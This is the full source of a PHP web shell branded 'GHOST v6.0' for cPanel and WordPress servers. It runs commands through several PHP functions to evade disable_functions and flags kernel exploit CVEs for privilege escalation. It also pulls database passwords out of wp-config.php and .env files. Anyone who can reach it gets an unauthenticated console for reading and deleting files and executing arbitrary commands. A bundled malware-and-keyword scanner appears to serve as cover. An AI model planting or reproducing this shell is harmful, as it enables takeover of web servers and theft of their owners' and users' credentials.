<?php
/**
 * GHOST v6.0 — Tactical Bypass & Deep Inspection
 * Target: SuperCP/cPanel, WordPress, Custom PHP
 */

@ob_start();
error_reporting(0);
ini_set('display_errors', '0');
set_time_limit(0);
ignore_user_abort(true);

$GHOST_ROOT = @realpath($_SERVER['DOCUMENT_ROOT'] ?? getcwd()) ?: getcwd();

// [01] SMART EXECUTION (Bypass disable_functions)
function g_exec($cmd, $timeout = 30) {
    $cmd = "timeout $timeout sh -c " . escapeshellarg($cmd) . " 2>&1";
    $methods = ['shell_exec', 'system', 'passthru', 'exec', 'popen', 'proc_open'];
    foreach ($methods as $m) {
        if (!function_exists($m)) continue;
        if ($m === 'shell_exec') { $out = @shell_exec($cmd); if ($out !== null) return ['out'=>$out, 'via'=>$m]; }
        if ($m === 'system') { ob_start(); @system($cmd); $out = ob_get_clean(); if ($out) return ['out'=>$out, 'via'=>$m]; }
        if ($m === 'passthru') { ob_start(); @passthru($cmd); $out = ob_get_clean(); if ($out) return ['out'=>$out, 'via'=>$m]; }
        if ($m === 'exec') { $o=[]; @exec($cmd, $o); if ($o) return ['out'=>implode("\n", $o), 'via'=>$m]; }
        if ($m === 'popen') { $f=@popen($cmd,'r'); if($f){$r='';while(!feof($f))$r.=fread($f,8192);pclose($f);return ['out'=>$r, 'via'=>$m];} }
        if ($m === 'proc_open') { $d=[1=>['pipe','w'],2=>['pipe','w']];$p=@proc_open($cmd,$d,$pp);if(is_resource($p)){$r=stream_get_contents($pp[1]).stream_get_contents($pp[2]);fclose($pp[1]);fclose($pp[2]);proc_close($p);return ['out'=>$r, 'via'=>$m];} }
    }
    return ['out'=>"[-] All execution methods blocked.", 'via'=>'none'];
}

function g_read($path) {
    if (@is_dir($path)) return "[-] Error: Path is a directory.";
    if (!@is_file($path)) return "[-] Error: File not found.";
    if (function_exists('file_get_contents')) { $d = @file_get_contents($path); if ($d !== false) return $d; }
    $f = @fopen($path, 'rb'); if ($f) { $d=''; while(!feof($f)) $d .= fread($f, 8192); fclose($f); return $d; }
    return g_exec('cat ' . escapeshellarg($path))['out'];
}

// [02] FINGERPRINTING (Deep Probe via Port & Binary)
function g_fingerprint() {
    $os = trim(g_exec('uname -a')['out']);
    $user = trim(g_exec('whoami')['out']);
    $cpanel = 'Not Found';
    $cves = [];
    
    // 1. Probe Port cPanel
    foreach ([2082, 2083, 2086, 2087] as $port) {
        if (@fsockopen('127.0.0.1', $port, $errno, $errstr, 0.5)) {
            $cpanel = "cPanel/WHM Active on port $port";
            break;
        }
    }
    
    // 2. Probe Binary cPanel
    if ($cpanel === 'Not Found') {
        $ls = g_exec('ls -la /usr/local/cpanel/cpanel 2>/dev/null')['out'];
        if (strpos($ls, 'cpanel') !== false) $cpanel = "cPanel Installed (Binary Found)";
    }

    // 3. CVE Spesifik
    if (strpos($os, '4.18') !== false) $cves[] = "CVE-2022-0847 (Dirty Pipe - Linux Kernel 4.18)";
    if (strpos($os, '5.8') !== false) $cves[] = "CVE-2022-0847 (Dirty Pipe - Linux Kernel 5.8)";
    if (strpos($os, '3.10') !== false) $cves[] = "CVE-2016-5195 (Dirty COW - Linux Kernel 3.10)";
    if (strpos($os, '2.6') !== false) $cves[] = "CVE-2009-2692 (Linux Kernel 2.6 Null Pointer)";
    
    $wp_ver = 'Not Found';
    if (@is_file($GHOST_ROOT . '/wp-includes/version.php')) {
        preg_match('/\$wp_version\s*=\s*[\'"]([^\'"]+)/', g_read($GHOST_ROOT . '/wp-includes/version.php'), $m);
        if (isset($m[1])) {
            $wp_ver = $m[1];
            if (version_compare($wp_ver, '6.4', '<')) $cves[] = "CVE-2023-XXXX (WP Core < 6.4 RCE)";
        }
    }
    
    return ['OS'=>$os, 'User'=>$user, 'cPanel'=>$cpanel, 'WP_Ver'=>$wp_ver, 'CVEs'=>$cves, 'WAF'=>'None'];
}

// [03] DEEP SCANNER (Anti-Crash & Full File)
function g_scan_files() {
    $res = ['malware'=>[], 'illegal'=>[], 'scanned'=>0];
    $keywords = ['slot','gacor','togel','judi','maxwin','bokep','porno','scam','phising'];
    $sigs = ['eval($_', 'base64_decode', 'gzinflate', 'shell_exec', 'passthru', 'system(', 'assert('];
    $ignore = ['jpg','png','gif','mp4','pdf','zip','tar','gz'];
    
    $it = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($GHOST_ROOT, FilesystemIterator::SKIP_DOTS));
    foreach ($it as $f) {
        if (!$f->isFile()) continue;
        $ext = strtolower($f->getExtension());
        if (in_array($ext, $ignore)) continue;
        if ($f->getSize() > 2*1024*1024) continue;
        
        $res['scanned']++;
        $path = $f->getPathname();
        $c = g_read($path);
        
        $hits = [];
        foreach ($sigs as $s) { if (stripos($c, $s) !== false) $hits[] = $s; }
        if (count($hits) >= 2 || preg_match('/eval\s*\(\s*(base64_decode|\$_)/i', $c)) {
            $res['malware'][] = ['file'=>$path, 'desc'=>'Terdeteksi '.count($hits).' signature backdoor.'];
        } elseif ($ext === 'php' && strlen(trim($c)) < 10) {
            $res['malware'][] = ['file'=>$path, 'desc'=>'File PHP kosong (Backdoor truncated).'];
        }
        
        $kw_found = [];
        foreach ($keywords as $k) { if (stripos($c, $k) !== false) $kw_found[] = $k; }
        if ($kw_found) $res['illegal'][] = ['file'=>$path, 'keywords'=>array_unique($kw_found)];
    }
    return $res;
}

// [04] DB HARVEST (Multi-Fallback & Shell Logs)
function g_db_harvest() {
    $logs = []; $db_info = []; $connected = false; $conn = null;
    
    // 1. Cari Config Umum
    $configs = ['wp-config.php','.env','configuration.php','config/database.php'];
    foreach ($configs as $f) {
        $p = $GHOST_ROOT . '/' . $f;
        if (!@is_file($p)) continue;
        $logs[] = "[+] Config found: $f";
        $c = g_read($p);
        preg_match('/(?:DB_USER|db_user|username)\s*[=\'"]+\s*([^\'";\s]+)/i', $c, $u);
        preg_match('/(?:DB_PASSWORD|db_password|password)\s*[=\'"]+\s*([^\'";\s]+)/i', $c, $p2);
        preg_match('/(?:DB_NAME|db_name|database)\s*[=\'"]+\s*([^\'";\s]+)/i', $c, $n);
        $user = $u[1] ?? ''; $pass = $p2[1] ?? ''; $db = $n[1] ?? '';
        if ($user && $pass) {
            $db_info = ['user'=>$user, 'pass'=>$pass, 'db'=>$db];
            $conn = @mysqli_connect('localhost', $user, $pass, $db);
            if ($conn) { $connected = true; $logs[] = "[!] DB Connected: $db"; break; }
        }
    }
    
    // 2. Fallback: Shell Logs (Cari config secara manual jika PHP tidak bisa baca)
    if (!$connected) {
        $logs[] = "[*] Fallback: Mencari config via shell...";
        $find = g_exec('find /home -name "wp-config.php" -o -name ".env" 2>/dev/null | head -n 5')['out'];
        if (trim($find)) {
            $logs[] = "[+] Ditemukan via shell:\n$find";
            foreach (explode("\n", trim($find)) as $cfg_path) {
                if (!$cfg_path) continue;
                $c = g_read($cfg_path);
                if (preg_match('/DB_PASSWORD.*[\'"]([^\'"]+)/', $c, $m)) {
                    $db_info['pass'] = $m[1]; $logs[] = "[!] Extracted Password: ".$m[1];
                }
            }
        }
    }
    return ['logs'=>$logs, 'info'=>$db_info];
}

// [05] ROUTER
$act = $_POST['act'] ?? '';
if ($act) {
    header('Content-Type: application/json');
    if ($act === 'fingerprint') echo json_encode(g_fingerprint());
    elseif ($act === 'scan') echo json_encode(g_scan_files());
    elseif ($act === 'db_scan') echo json_encode(g_db_harvest());
    elseif ($act === 'read_file') echo json_encode(['content'=>g_read($_POST['path']??'')]);
    elseif ($act === 'del_file') echo json_encode(['status'=>@unlink($_POST['path']??'')?'ok':'fail']);
    elseif ($act === 'exec') echo json_encode(g_exec($_POST['cmd']??''));
    exit;
}
?>
<!DOCTYPE html>
<html>
<head>
<title>GHOST v6.0</title>
<style>
    body { background:#0a0a0a; color:#0f0; font-family:monospace; padding:20px; }
    .box { border:1px solid #0f0; padding:15px; margin-bottom:15px; background:#111; }
    button { background:#000; color:#0f0; border:1px solid #0f0; padding:8px; cursor:pointer; font-weight:bold; }
    button:hover { background:#0f0; color:#000; }
    pre { background:#000; padding:10px; border:1px solid #333; max-height:300px; overflow:auto; white-space:pre-wrap; }
    table { width:100%; border-collapse:collapse; margin-top:10px; }
    th,td { border:1px solid #333; padding:8px; text-align:left; }
    th { background:#222; }
    .btn-red { border-color:#f00; color:#f00; }
</style>
</head>
<body>

<div class="box">
    <h2>[+] Fingerprinting</h2>
    <button onclick="run('fingerprint','out-fp')">Scan Profile</button>
    <pre id="out-fp">Waiting...</pre>
</div>

<div class="box">
    <h2>[+] Deep Malware Scan</h2>
    <button onclick="run('scan','out-scan')">Scan Semua File</button>
    <div id="scan-results"></div>
</div>

<div class="box">
    <h2>[+] Database Harvest</h2>
    <button onclick="run('db_scan','out-db')">Scan DB (Multi-Method)</button>
    <pre id="out-db">Waiting...</pre>
</div>

<div class="box">
    <h2>[+] Console</h2>
    <input type="text" id="cmd" placeholder="whoami" style="width:80%;">
    <button onclick="execCmd()">Exec</button>
    <pre id="out-exec">Ketik 'help' untuk perintah.</pre>
</div>

<script>
function esc(s){ return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }

async function api(act, params={}) {
    const body = new URLSearchParams(); body.append('act',act);
    for (let k in params) body.append(k, params[k]);
    const r = await fetch('', {method:'POST', body});
    return await r.json();
}

async function run(act, target) {
    document.getElementById(target).innerText = 'Running...';
    try {
        const d = await api(act);
        if (act === 'scan') renderScan(d);
        else document.getElementById(target).innerText = JSON.stringify(d,null,2);
    } catch(e) { document.getElementById(target).innerText = 'Error: '+e.message; }
}

function renderScan(d) {
    let h = `<p>Total File: ${d.scanned} | Malware: ${d.malware.length} | Ilegal: ${d.illegal.length}</p>`;
    if (d.malware.length) {
        h += `<h3>Malware</h3><table><tr><th>File</th><th>Desc</th><th>Aksi</th></tr>`;
        d.malware.forEach(x => {
            h += `<tr><td>${esc(x.file)}</td><td>${esc(x.desc)}</td>
                <td><button onclick="view('${esc(x.file)}')">View</button>
                <button class="btn-red" onclick="del('${esc(x.file)}')">Delete</button></td></tr>`;
        });
        h += `</table>`;
    }
    if (d.illegal.length) {
        h += `<h3>Ilegal</h3><table><tr><th>File</th><th>Keyword</th><th>Aksi</th></tr>`;
        d.illegal.forEach(x => {
            h += `<tr><td>${esc(x.file)}</td><td>${esc(x.keywords.join(', '))}</td>
                <td><button onclick="view('${esc(x.file)}')">View</button></td></tr>`;
        });
        h += `</table>`;
    }
    document.getElementById('scan-results').innerHTML = h;
}

async function view(p) { const d = await api('read_file',{path:p}); alert(d.content.slice(0,1000)); }
async function del(p) { if(!confirm('Hapus?')) return; await api('del_file',{path:p}); run('scan',''); }

async function execCmd() {
    const c = document.getElementById('cmd').value;
    if(!c) return;
    document.getElementById('out-exec').innerText = '$ '+c+'\nRunning...';
    const d = await api('exec',{cmd:c});
    document.getElementById('out-exec').innerText = '$ '+c+'\n\n'+d.out;
}
</script>
</body>
</html>
